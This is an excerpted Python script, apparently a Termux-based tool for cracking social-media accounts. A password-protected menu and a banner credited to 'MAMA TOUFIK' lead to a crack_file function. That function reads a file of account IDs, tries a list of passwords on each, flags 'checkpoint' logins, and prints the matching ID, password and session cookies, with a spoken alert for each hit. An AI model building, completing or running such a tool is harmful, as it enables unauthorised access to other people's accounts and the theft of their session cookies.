...
while attemps < 12345677901:
    ...
    if username == 'Caca' and password == 'Toufik':
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CEO MAMA TOUFIK   FIRE (🥰)
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/caca.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#MAMA-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•CACA-Cp] {idf} • {pw}\n\033[0;93[👅]= COOKIES• \033[0;92m{kuki} ')     
				...
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " CACA,  Ok,  id"')
